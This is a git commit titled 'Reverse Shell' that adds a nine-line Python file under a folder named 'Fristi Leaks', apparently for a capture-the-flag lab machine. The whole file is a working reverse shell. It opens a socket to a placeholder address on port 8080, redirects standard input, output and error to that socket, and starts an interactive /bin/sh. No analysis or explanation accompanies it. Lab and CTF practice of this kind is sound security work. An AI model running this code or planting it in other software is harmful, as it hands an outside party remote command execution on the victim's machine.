a04d6aa2411a5164d02b65610d4625acd81b1157
Rickirick4 <71150839+Rickirick4@users.noreply.github.com>
2022-07-05 19:04:16 +0300

    Reverse Shell

---
+++ Fristi Leaks/pythonReverseShell.py
@@ -0,0 +1,9 @@
+import socket
+import subprocess
+import os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("X.X.X.X",8080))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/sh","-i"])
